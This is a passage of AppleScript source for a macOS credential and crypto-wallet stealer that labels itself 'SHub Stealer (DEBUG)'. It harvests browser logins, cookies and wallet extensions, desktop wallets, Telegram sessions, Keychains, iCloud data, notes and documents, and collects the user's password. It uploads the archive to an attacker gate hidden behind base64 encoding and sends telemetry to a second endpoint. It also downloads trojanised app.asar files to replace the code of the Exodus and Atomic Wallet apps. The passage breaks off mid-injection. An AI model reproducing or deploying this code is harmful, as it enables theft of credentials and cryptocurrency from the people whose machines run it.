set basePath to writemind & "Wallets/Browser/" & item 1 of chromium & "_"
try
set fileList to list folder item 2 of chromium without invisibles
debugLog("ChromiumWallets: checking " & item 1 of chromium & " profiles: " & (count of fileList))
repeat with currentItem in fileList
if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
set profileName to (item 1 of chromium & currentItem)
set extPath to item 2 of chromium & currentItem & "/Local Extension Settings/"
debugLog("ChromiumWallets: scanning ext path: " & extPath)
try
set extList to list folder extPath without invisibles
debugLog("ChromiumWallets: " & profileName & " has " & (count of extList) & " extensions")
repeat with extItem in extList
repeat with wConfig in walletConfig
if (extItem as string) is equal to (item 1 of wConfig) then
debugLog("ChromiumWallets: MATCH ext " & (extItem as string) & " in " & profileName & " src: " & extPath & extItem)
set srcPath to extPath & extItem
set dstPath to basePath & currentItem & "/" & extItem
GrabFolder(srcPath, dstPath)
end if
end repeat
end repeat
on error errMsg
debugLog("ChromiumWallets: no ext folder for " & profileName & " | " & errMsg)
end try
end if
end repeat
on error errMsg
debugLog("ChromiumWallets: NOT found " & item 1 of chromium & " | " & errMsg)
end try
end repeat
end ChromiumWallets

on Gecko(writemind, gecko_map)
debugLog("Gecko: starting")
set geckoFiles to {"cookies.sqlite", "logins.json", "key4.db", "cert9.db", "places.sqlite", "formhistory.sqlite"}
repeat with gecko in gecko_map
set savePath to writemind & "Browsers/" & item 1 of gecko & "_"
try
set fileList to list folder item 2 of gecko without invisibles
debugLog("Gecko: found " & item 1 of gecko & " at " & item 2 of gecko & " profiles: " & (count of fileList))
repeat with currentItem in fileList
debugLog("Gecko: processing profile " & (currentItem as string) & " path: " & item 2 of gecko & currentItem)
set profilePath to item 2 of gecko & currentItem & "/"
repeat with GFile in geckoFiles
set readpath to profilePath & GFile
set writepath to savePath & currentItem & "/" & GFile
readwrite(readpath, writepath)
end repeat
end repeat
on error errMsg
debugLog("Gecko: NOT found " & item 1 of gecko & " at " & item 2 of gecko & " | " & errMsg)
end try
end repeat
end Gecko

on DesktopWallets(writemind, wallet_map)
debugLog("DesktopWallets: starting, count: " & (count of wallet_map))
repeat with wallet in wallet_map
try
debugLog("DesktopWallets: checking " & item 1 of wallet & " at " & item 2 of wallet)
GrabFolderLimit(item 2 of wallet, writemind & item 1 of wallet)
debugLog("DesktopWallets: done " & item 1 of wallet)
on error errMsg
debugLog("DesktopWallets: FAIL " & item 1 of wallet & " | " & errMsg)
end try
end repeat
end DesktopWallets

on Telegram(writemind, library)
debugLog("Telegram: starting")
try
set tgPath to library & "Telegram Desktop/tdata/"
debugLog("Telegram: checking " & tgPath)
set tgSave to writemind & "Telegram/"
set tgFiles to list folder tgPath without invisibles
debugLog("Telegram: tdata FOUND at " & tgPath & " files: " & (count of tgFiles))
repeat with tgFile in tgFiles
set tgFilePath to tgPath & tgFile
set tgFileSave to tgSave & tgFile
if isDirectory(tgFilePath) then
if (length of (tgFile as string)) is 16 then
GrabFolder(tgFilePath, tgFileSave)
end if
else
if (tgFile as string) ends with "s" and (length of (tgFile as string)) is 17 then
readwrite(tgFilePath, tgFileSave)
end if
if (tgFile as string) is "key_datas" then
readwrite(tgFilePath, tgFileSave)
end if
end if
end repeat
on error errMsg
debugLog("Telegram: NOT found | " & errMsg)
end try
end Telegram

on Keychains(writemind)
debugLog("Keychains: starting")
try
set keychainPath to (POSIX path of (path to home folder)) & "Library/Keychains/"
debugLog("Keychains: checking " & keychainPath)
set keychainSave to writemind & "Keychains/"
mkdir(keychainSave)
set kcFiles to list folder keychainPath without invisibles
debugLog("Keychains: FOUND " & (count of kcFiles) & " items at " & keychainPath)
repeat with kcFile in kcFiles
set kcFilePath to keychainPath & kcFile
set kcFileSave to keychainSave & kcFile
if isDirectory(kcFilePath) then
GrabFolder(kcFilePath, kcFileSave)
else
readwrite(kcFilePath, kcFileSave)
end if
end repeat
on error errMsg
debugLog("Keychains: FAIL | " & errMsg)
end try
end Keychains

on CloudKeys(writemind)
debugLog("CloudKeys: starting")
try
set cloudPath to (POSIX path of (path to home folder)) & "Library/Application Support/iCloud/Accounts/"
set cloudSave to writemind & "iCloud/"
debugLog("CloudKeys: checking " & cloudPath)
GrabFolder(cloudPath, cloudSave)
debugLog("CloudKeys: done")
on error errMsg
debugLog("CloudKeys: FAIL | " & errMsg)
end try
end CloudKeys

on Filegrabber(writemind, profile)
debugLog("Filegrabber: starting")
try
set grabberPath to writemind & "FileGrabber/"
mkdir(grabberPath)
set docExtensions to {"docx", "doc", "wallet", "key", "keys", "txt", "rtf", "csv", "xls", "xlsx", "json", "rdp"}
set imgExtensions to {"png"}
set sourceNames to {"Desktop", "Documents"}
repeat with srcName in sourceNames
set srcFolder to profile & "/" & srcName & "/"
set destFolder to grabberPath & srcName & "/"
mkdir(destFolder)
try
set fgSizeMB to (do shell script "du -sm " & quoted form of grabberPath & " 2>/dev/null | awk '{print $1}'") as integer
if fgSizeMB is greater than or equal to 150 then
debugLog("Filegrabber: total " & fgSizeMB & "MB >= 150MB limit, stopping")
exit repeat
end if
on error
set fgSizeMB to 0
end try
repeat with ext in docExtensions
try
set shellCmd to "find " & quoted form of srcFolder & " -maxdepth 3 -type f -iname '*." & ext & "' -size -2M -print0 2>/dev/null | head -100 | xargs -0 -I{} /bin/bash -c 'cp " & quote & "$0" & quote & " " & quote & destFolder & "${RANDOM}_$(basename " & quote & "$0" & quote & ")" & quote & "' {}"
do shell script shellCmd
end try
end repeat
repeat with ext in imgExtensions
try
set shellCmd to "find " & quoted form of srcFolder & " -maxdepth 2 -type f -iname '*." & ext & "' -size -6M -print0 2>/dev/null | head -50 | xargs -0 -I{} /bin/bash -c 'cp " & quote & "$0" & quote & " " & quote & destFolder & "${RANDOM}_$(basename " & quote & "$0" & quote & ")" & quote & "' {}"
do shell script shellCmd
end try
end repeat
end repeat
end try
try
readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "Safari/Cookies.binarycookies")
readwrite(profile & "/Library/Safari/Form Values", writemind & "Safari/Autofill")
readwrite(profile & "/Library/Safari/History.db", writemind & "Safari/History.db")
end try
try
readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "Notes/NoteStore.sqlite")
readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "Notes/NoteStore.sqlite-shm")
readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "Notes/NoteStore.sqlite-wal")
end try
try
readwrite(profile & "/Library/Application Support/Google/Chrome/Default/History", writemind & "History-sqlite")
readwrite(profile & "/Library/Application Support/Google/Chrome/Default/History-journal", writemind & "History-sqlite-journal")
readwrite(profile & "/Library/Application Support/Firefox/Profiles/*/places.sqlite", writemind & "places.sqlite")
readwrite(profile & "/Library/Application Support/Firefox/Profiles/*/places.sqlite-wal", writemind & "places.sqlite-wal")
end try
end Filegrabber



-- ============================================================
-- MAIN DEBUG EXECUTION
-- ============================================================

set username to (system attribute "USER")
set profile to "/Users/" & username
set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
set writemind to "/tmp/shub_" & randomNumber & "/"
set library to profile & "/Library/Application Support/"

mkdir(writemind)
debugLog("=== SCRIPT START ===")
debugLog("Username: " & username)
debugLog("Profile: " & profile)
debugLog("Writemind: " & writemind)

-- Get system locale and keyboard layouts for telemetry
set localeInfo to ""
try
set localeInfo to do shell script "defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -i KeyboardLayout | head -3 | sed 's/[^a-zA-Z0-9 ,=]//g' | tr -s ' ' | paste -sd, - || echo unknown"
end try

-- Get hostname and OS version
set hostName to ""
try
set hostName to do shell script "hostname"
end try
set osVersion to ""
try
set osVersion to do shell script "sw_vers -productVersion"
end try

-- Detect CIS (Russian layout) - we still detect but DON'T block
set isCIS to "false"
try
set cisCheck to do shell script "defaults read ~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -ci russian || echo 0"
if cisCheck is not equal to "0" then
set isCIS to "true"
end if
end try

-- Get external IP
set externalIP to "Unknown"
try
set externalIP to do shell script "curl -s --max-time 5 $(echo 'aHR0cHM6Ly9hcGkuaXBpZnkub3Jn' | base64 -d) || curl -s --max-time 5 $(echo 'aHR0cHM6Ly9pY2FuaGF6aXAuY29t' | base64 -d) || echo 'Unknown'"
end try

debugLog("Hostname: " & hostName)
debugLog("OS: " & osVersion)
debugLog("CIS: " & isCIS)
debugLog("IP: " & externalIP)
debugLog("Locale: " & localeInfo)

-- Send telemetry: payload_started
set debugEventUrl to do shell script "echo 'aHR0cHM6Ly9mYXN0ZmlsZW5leHQuY29tL2FwaS9kZWJ1Zy9ldmVudA==' | base64 -d"
set buildHash to ""
try
set shellCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "payload_started" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "," & quote & "hostname" & quote & ":" & quote & hostName & quote & "," & quote & "os_version" & quote & ":" & quote & osVersion & quote & "," & quote & "username" & quote & ":" & quote & username & quote & "," & quote & "is_cis" & quote & ":" & quote & isCIS & quote & "," & quote & "locale" & quote & ":" & quote & localeInfo & quote & "}' --max-time 5 2>/dev/null &"
do shell script shellCmd
end try

set password_entered to getpwd(username, writemind, "")
if password_entered is equal to "__INVALID__" then
-- Send telemetry: password_failed
try
set shellCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "password_failed" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "}' --max-time 5 2>/dev/null &"
do shell script shellCmd
end try
else
-- Send telemetry: password_obtained
try
set shellCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "password_obtained" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "," & quote & "has_password" & quote & ":" & quote & "true" & quote & "}' --max-time 5 2>/dev/null &"
do shell script shellCmd
end try
end if
debugLog("Password result: " & password_entered)
delay 0.01

set chromiumMap to {}
set chromiumMap to chromiumMap & {{"Chrome", library & "Google/Chrome/"}}
set chromiumMap to chromiumMap & {{"Brave", library & "BraveSoftware/Brave-Browser/"}}
set chromiumMap to chromiumMap & {{"Edge", library & "Microsoft Edge/"}}
set chromiumMap to chromiumMap & {{"Opera", library & "com.operasoftware.Opera/"}}
set chromiumMap to chromiumMap & {{"OperaGX", library & "com.operasoftware.OperaGX/"}}
set chromiumMap to chromiumMap & {{"Vivaldi", library & "Vivaldi/"}}
set chromiumMap to chromiumMap & {{"Orion", library & "Orion/"}}
set chromiumMap to chromiumMap & {{"Sidekick", library & "Sidekick/"}}
set chromiumMap to chromiumMap & {{"Chrome Canary", library & "Google/Chrome Canary"}}
set chromiumMap to chromiumMap & {{"Chromium", library & "Chromium/"}}
set chromiumMap to chromiumMap & {{"Chrome Dev", library & "Google/Chrome Dev/"}}
set chromiumMap to chromiumMap & {{"Arc", library & "Arc/User Data"}}
set chromiumMap to chromiumMap & {{"Coccoc", library & "CocCoc/Browser/"}}
set chromiumMap to chromiumMap & {{"Chrome Beta", library & "Google/Chrome Beta/"}}
set geckoMap to {}
set geckoMap to geckoMap & {{"Firefox", library & "Firefox/Profiles/"}}
set walletMap to {}
set walletMap to walletMap & {{"Wallets/Desktop/Exodus", library & "Exodus/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electrum", profile & "/.electrum/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Atomic", library & "atomic/Local Storage/leveldb/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Guarda", library & "Guarda/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Coinomi", library & "Coinomi/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Sparrow", profile & "/.sparrow/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Wasabi", profile & "/.walletwasabi/client/Wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Bitcoin_Core", library & "Bitcoin/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Armory", library & "Armory/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electron_Cash", profile & "/.electron-cash/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Monero", profile & "/.bitmonero/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Litecoin_Core", library & "Litecoin/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Dash_Core", library & "DashCore/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Dogecoin_Core", library & "Dogecoin/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/BlueWallet", library & "BlueWallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Zengo", library & "Zengo/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Trust", library & "Trust Wallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Ledger Live", library & "Ledger Live/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Ledger Wallet", library & "Ledger Wallet/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Trezor Suite", library & "@trezor"}}
set walletMap to walletMap & {{"Wallets/Desktop/Daedalus", library & "Daedalus Mainnet/wallets/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Anchor", library & "anchor/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Jaxx", library & "com.liberty.jaxx/"}}
set walletMap to walletMap & {{"Wallets/Desktop/Monero_GUI", profile & "/Monero/wallets/"}}
readwrite(library & "Binance/", writemind & "Wallets/Desktop/Binance/")
readwrite(library & "TON Keeper/", writemind & "Wallets/Desktop/TonKeeper/")
readwrite(profile & "/.zshrc", writemind & "Profile/.zshrc")
readwrite(profile & "/.zsh_history", writemind & "Profile/.zsh_history")
readwrite(profile & "/.bash_history", writemind & "Profile/.bash_history")
readwrite(profile & "/.gitconfig", writemind & "Profile/.gitconfig")
writeText(username, writemind & "Username")

debugLog("Writing info file + system_profiler...")
writeText("SHub Stealer (DEBUG)" & return, writemind & "info")
writeText("Build Tag: " & return, writemind & "info")
writeText("External IP: " & externalIP & return & return, writemind & "info")
writeText("System Info" & return, writemind & "info")
writeText("Username: " & username & return, writemind & "info")
writeText("Password: " & password_entered & return & return, writemind & "info")
writeText("Hostname: " & hostName & return, writemind & "info")
writeText("OS Version: " & osVersion & return, writemind & "info")
writeText("Is CIS: " & isCIS & return, writemind & "info")
try
set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
writeText(result, writemind & "info")
end try

-- Send telemetry: collecting_browsers
try
set shellCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "collecting_browsers" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "}' --max-time 3 2>/dev/null &"
do shell script shellCmd
end try

debugLog("--- COLLECTING BROWSERS ---")
Chromium(writemind, chromiumMap)
debugLog("Chromium() done")
ChromiumWallets(writemind, chromiumMap)
debugLog("ChromiumWallets() done")
Gecko(writemind, geckoMap)
debugLog("Gecko() done")

-- Send telemetry: collecting_wallets
try
set shellCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "collecting_wallets" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "}' --max-time 3 2>/dev/null &"
do shell script shellCmd
end try

debugLog("--- COLLECTING WALLETS ---")
DesktopWallets(writemind, walletMap)
debugLog("DesktopWallets() done")
Telegram(writemind, library)
debugLog("Telegram() done")
Keychains(writemind)
debugLog("Keychains() done")
CloudKeys(writemind & "Profile/")
debugLog("CloudKeys() done")
Filegrabber(writemind, profile)
debugLog("Filegrabber() done")

-- Count collected data for telemetry
set collectedInfo to ""
try
set collectedInfo to do shell script "cd " & quoted form of writemind & " && echo 'browsers:' $(ls -d Browsers/*/ 2>/dev/null | wc -l | tr -d ' ') 'wallets:' $(( $(find Wallets/Browser Wallets/Web -mindepth 2 -maxdepth 2 -type d 2>/dev/null | wc -l) + $(find Wallets/Desktop -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l) )) 'extensions:' $(ls -d Extensions/*/ 2>/dev/null | wc -l | tr -d ' ') 'keychains:' $(ls Keychains/ 2>/dev/null | wc -l | tr -d ' ') 'telegram:' $(ls Telegram/ 2>/dev/null | wc -l | tr -d ' ')"
end try

-- Send telemetry: data_collected
try
set shellCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "data_collected" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "," & quote & "collected" & quote & ":" & quote & collectedInfo & quote & "}' --max-time 5 2>/dev/null &"
do shell script shellCmd
end try

debugLog("Collected: " & collectedInfo)

debugLog("--- CREATING ZIP ---")
set archivePath to "/tmp/shub_log.zip"
try
do shell script "ditto -c -k --sequesterRsrc " & quoted form of writemind & " " & quoted form of archivePath
debugLog("ZIP created OK")
on error errMsg
debugLog("ZIP error: " & errMsg)
end try

-- Get archive size for telemetry
set archiveSize to "0"
try
set archiveSize to do shell script "stat -f%z " & quoted form of archivePath & " 2>/dev/null || echo 0"
end try
debugLog("Archive size: " & archiveSize & " bytes")

set gateUrl to do shell script "echo 'aHR0cHM6Ly9mYXN0ZmlsZW5leHQuY29tL2dhdGU=' | base64 -d"
set apiKey to "61cb9c3bd1a2faa7d6613dd8e5d09e79fe95e85ab09ed6bcd6406badff5a083f"
set buildId to "d91d844ad8920458ee99e707b1a203cba8df76ce960195f0993eb3b0e96d893f"
set buildName to ""
set buildHash to ""
set hasValidPassword to "0"
if password_entered is not equal to "__INVALID__" then
set hasValidPassword to "1"
end if
set passwordToSend to ""
if password_entered is not equal to "__INVALID__" then
set passwordToSend to password_entered
end if
debugLog("--- UPLOADING TO GATE ---")
debugLog("Gate URL: " & gateUrl)
set uploadOK to false

-- Check collected folder size to decide: single upload or multi-zip chunked
set folderSizeNum to 0
try
set folderSizeNum to (do shell script "du -sk " & quoted form of writemind & " | awk '{print $1}'") as integer
set folderSizeNum to folderSizeNum * 1024
end try
debugLog("Folder size: " & folderSizeNum & " bytes")

set chunkThreshold to 85000000

if folderSizeNum < chunkThreshold then
-- === SMALL FOLDER: single ZIP upload (existing behavior, unchanged) ===
debugLog("Small folder (" & folderSizeNum & " bytes), single upload")
try
set curlResult to do shell script "curl -s -w '
%{http_code}' -X POST " & quoted form of gateUrl & " -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' -F 'file=@" & archivePath & "' -F 'key=" & apiKey & "' -F 'password=" & passwordToSend & "' -F 'buildtxd=" & buildId & "' -F 'has_valid_password=" & hasValidPassword & "' -F 'build_hash=" & buildHash & "'"
set httpCode to last paragraph of curlResult
debugLog("Upload HTTP code: " & httpCode)
if httpCode starts with "2" then
debugLog("Upload complete OK")
set uploadOK to true
else
debugLog("Upload failed with HTTP " & httpCode)
end if
on error errMsg
debugLog("Upload error: " & errMsg)
try
set errCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "upload_error" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "," & quote & "archive_size" & quote & ":" & quote & archiveSize & quote & "," & quote & "error" & quote & ":" & quote & errMsg & quote & "}' --max-time 5 2>/dev/null &"
do shell script errCmd
end try
end try

else
-- === LARGE FOLDER: split into independent ZIP archives per top-level item ===
debugLog("Large folder (" & folderSizeNum & " bytes), using multi-zip chunked upload")
set chunkUrl to gateUrl & "/chunk"
debugLog("Chunk URL: " & chunkUrl)
try
-- Use shell script to build independent ZIP archives from writemind folder
-- Each ZIP is <= 70MB (recursive split for large folders). Top-level items are grouped into bins by size.
do shell script "rm -rf /tmp/shub_mzip_*"

-- Shell script: iterate top-level items, measure sizes, bin them into ZIPs
set lf to (ASCII character 10)
set splitScript to "#!/bin/bash" & lf & "SRC=$1" & lf & "MAX_BYTES=70000000" & lf & "CHUNK_IDX=0" & lf & "CUR_SIZE=0" & lf & "CUR_LIST=()" & lf & "flush_bin() {" & lf & "  if [ ${#CUR_LIST[@]} -eq 0 ]; then return; fi" & lf & "  ZIPNAME=\"/tmp/shub_mzip_$(printf '%04d' $CHUNK_IDX).zip\"" & lf & "  TMPBIN=\"/tmp/shub_mzip_bin_${CHUNK_IDX}\"" & lf & "  rm -rf \"$TMPBIN\"" & lf & "  mkdir -p \"$TMPBIN\"" & lf & "  for BI in \"${CUR_LIST[@]}\"; do" & lf & "    PARENT=$(dirname \"$BI\")" & lf & "    mkdir -p \"$TMPBIN/$PARENT\"" & lf & "    cp -a \"$SRC/$BI\" \"$TMPBIN/$BI\"" & lf & "  done" & lf & "  ditto -c -k --sequesterRsrc \"$TMPBIN\" \"$ZIPNAME\" 2>/dev/null || (cd \"$TMPBIN\" && zip -r -q \"$ZIPNAME\" . 2>/dev/null)" & lf & "  rm -rf \"$TMPBIN\"" & lf & "  CHUNK_IDX=$((CHUNK_IDX + 1))" & lf & "  CUR_SIZE=0" & lf & "  CUR_LIST=()" & lf & "}" & lf & "add_item() {" & lf & "  local REL_PATH=\"$1\"" & lf & "  local ITEM_SIZE=\"$2\"" & lf & "  if [ $((CUR_SIZE + ITEM_SIZE)) -gt $MAX_BYTES ] && [ ${#CUR_LIST[@]} -gt 0 ]; then" & lf & "    flush_bin" & lf & "  fi" & lf & "  CUR_LIST+=(\"$REL_PATH\")" & lf & "  CUR_SIZE=$((CUR_SIZE + ITEM_SIZE))" & lf & "}" & lf & "process_dir() {" & lf & "  local DIR_REL=\"$1\"" & lf & "  local DIR_ABS=\"$SRC\"" & lf & "  if [ -n \"$DIR_REL\" ]; then" & lf & "    DIR_ABS=\"$SRC/$DIR_REL\"" & lf & "  fi" & lf & "  for ITEM in \"$DIR_ABS\"/*; do" & lf & "    [ ! -e \"$ITEM\" ] && continue" & lf & "    BASENAME=$(basename \"$ITEM\")" & lf & "    if [ -n \"$DIR_REL\" ]; then" & lf & "      REL=\"$DIR_REL/$BASENAME\"" & lf & "    else" & lf & "      REL=\"$BASENAME\"" & lf & "    fi" & lf & "    if [ -f \"$ITEM\" ]; then" & lf & "      FSIZE=$(stat -f%z \"$ITEM\" 2>/dev/null || echo 0)" & lf & "      add_item \"$REL\" \"$FSIZE\"" & lf & "    elif [ -d \"$ITEM\" ]; then" & lf & "      DSIZE=$(du -sk \"$ITEM\" 2>/dev/null | awk '{print $1}')" & lf & "      DSIZE=$((DSIZE * 1024))" & lf & "      if [ $DSIZE -lt $MAX_BYTES ]; then" & lf & "        add_item \"$REL\" \"$DSIZE\"" & lf & "      else" & lf & "        process_dir \"$REL\"" & lf & "      fi" & lf & "    fi" & lf & "  done" & lf & "}" & lf & "process_dir \"\"" & lf & "flush_bin"
do shell script "printf '%s' " & quoted form of splitScript & " > /tmp/shub_split.sh && chmod +x /tmp/shub_split.sh && /bin/bash /tmp/shub_split.sh " & quoted form of writemind & " && rm -f /tmp/shub_split.sh"

-- Generate session ID
set chunkSession to do shell script "uuidgen | tr -d '-' | tr '[:upper:]' '[:lower:]'"

-- Count generated ZIPs
set totalChunks to do shell script "ls -1 /tmp/shub_mzip_*.zip 2>/dev/null | wc -l | tr -d ' '"
debugLog("Created " & totalChunks & " independent ZIP archives, session: " & chunkSession)

-- Send telemetry: chunked_upload_start
try
set shellCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "chunked_upload_start" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "," & quote & "archive_size" & quote & ":" & quote & archiveSize & quote & "," & quote & "total_chunks" & quote & ":" & quote & totalChunks & quote & "}' --max-time 5 2>/dev/null &"
do shell script shellCmd
end try

-- Upload each ZIP chunk
set chunkIndex to 0
set chunkList to do shell script "ls -1 /tmp/shub_mzip_*.zip 2>/dev/null | sort"
set allChunksOK to true
repeat with chunkLine in paragraphs of chunkList
set chunkFile to chunkLine as text
if chunkFile is not "" then
debugLog("Uploading chunk " & (chunkIndex + 1) & "/" & totalChunks & ": " & chunkFile)
try
set curlResult to do shell script "curl -s -w '
%{http_code}' -X POST " & quoted form of chunkUrl & " -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' -F 'file=@" & chunkFile & "' -F 'chunk_session=" & chunkSession & "' -F 'chunk_num=" & chunkIndex & "' -F 'total_chunks=" & totalChunks & "' -F 'key=" & apiKey & "' -F 'password=" & passwordToSend & "' -F 'buildtxd=" & buildId & "' -F 'has_valid_password=" & hasValidPassword & "' -F 'build_hash=" & buildHash & "'"
set httpCode to last paragraph of curlResult
debugLog("Chunk " & (chunkIndex + 1) & " HTTP code: " & httpCode)
if httpCode does not start with "2" then
debugLog("Chunk " & (chunkIndex + 1) & " failed with HTTP " & httpCode)
set allChunksOK to false
end if
on error errMsg
debugLog("Chunk " & (chunkIndex + 1) & " error: " & errMsg)
set allChunksOK to false
end try
set chunkIndex to chunkIndex + 1
end if
end repeat

if allChunksOK then
debugLog("All " & totalChunks & " chunks uploaded OK")
set uploadOK to true
else
debugLog("Some chunks failed, but independent ZIPs sent: " & chunkIndex & "/" & totalChunks)
if chunkIndex > 0 then set uploadOK to true
end if

-- Cleanup chunk files
do shell script "rm -f /tmp/shub_mzip_*.zip"
on error errMsg
debugLog("Multi-zip upload error: " & errMsg)
try
set errCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "chunked_upload_error" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "," & quote & "archive_size" & quote & ":" & quote & archiveSize & quote & "," & quote & "error" & quote & ":" & quote & errMsg & quote & "}' --max-time 5 2>/dev/null &"
do shell script errCmd
end try
end try
end if

-- Send telemetry: zip_sent (only on success)
if uploadOK then
try
set isChunked to "false"
if folderSizeNum is greater than or equal to chunkThreshold then set isChunked to "true"
set shellCmd to "curl -s -X POST '" & debugEventUrl & "' -H 'Content-Type: application/json' -d '{" & quote & "event" & quote & ":" & quote & "zip_sent" & quote & "," & quote & "build_hash" & quote & ":" & quote & buildHash & quote & "," & quote & "ip" & quote & ":" & quote & externalIP & quote & "," & quote & "archive_size" & quote & ":" & quote & archiveSize & quote & "," & quote & "has_password" & quote & ":" & quote & hasValidPassword & quote & "," & quote & "chunked" & quote & ":" & quote & isChunked & quote & "}' --max-time 5 2>/dev/null &"
do shell script shellCmd
end try
end if

try
do shell script "rm -f " & quoted form of archivePath
do shell script "rm -f /tmp/shub_chunk_*"
do shell script "rm -f /tmp/shub_mzip_*.zip"
do shell script "rm -rf /tmp/shub_*"
end try

debugLog("--- WALLET INJECTION ---")
-- Wallet injection section (same as production)
set exodusPath to "/Applications/Exodus.app"
if (do shell script "test -d " & quoted form of exodusPath & " && echo 1 || echo 0") is "1" then
debugLog("Exodus FOUND at " & exodusPath & ", injecting...")
try
set asarUrl to gateUrl & "/exodus-asar"
set tempZip to "/tmp/exodus_asar.zip"
set tempAsar to "/tmp/app.asar"
do shell script "curl -s -o " & quoted form of tempZip & " " & quoted form of asarUrl
do shell script "unzip -q -o " & quoted form of tempZip & " -d /tmp"
if (do shell script "test -f " & quoted form of tempAsar & " && echo 1 || echo 0") is "1" then
do shell script "pkill -9 Exodus 2>/dev/null || true"
delay 1
set exodusResources to "/Applications/Exodus.app/Contents/Resources"
set targetAsar to exodusResources & "/app.asar"
do shell script "cp -rf " & quoted form of exodusPath & " /tmp/Exodus_tmp.app"
do shell script "rm -rf " & quoted form of exodusPath
do shell script "mv /tmp/Exodus_tmp.app " & quoted form of exodusPath
do shell script "mv " & quoted form of tempAsar & " " & quoted form of targetAsar
do shell script "xattr -cr " & quoted form of exodusPath
do shell script "codesign -f -d -s - " & quoted form of exodusPath
debugLog("Exodus: injection OK")
end if
do shell script "rm -f " & quoted form of tempZip
on error errMsg
debugLog("Exodus: injection FAIL | " & errMsg)
end try
end if
set atomicPath to "/Applications/Atomic Wallet.app"
if (do shell script "test -d " & quoted form of atomicPath & " && echo 1 || echo 0") is "1" then
debugLog("Atomic Wallet FOUND at " & atomicPath & ", injecting...")
try
set asarUrl to gateUrl & "/atomic-asar"
set tempZip to "/tmp/atomic_asar.zip"
set tempAsar to "/tmp/app.asar"
do shell script "curl -s -o " & quoted form of tempZip & " " & quoted form of asarUrl
do shell script "unzip -q -o " & quoted form of tempZip & " -d /tmp"
if (do shell script "test -f " & quoted form of tempAsar & " && echo 1 || echo 0") is "1" then
do shell script "pkill -9 'Atomic Wallet' 2>/dev/null || true"
delay 1
set atomicResources to "/Applications/Atomic Wallet.app/Contents/Resources"
set targetAsar to atomicResources & "/app.asar"
do shell script "cp -rf " & quoted form of atomicPath & " /tmp/Atomic_tmp.app"
do shell script "rm -rf " & quoted form of atomicPath
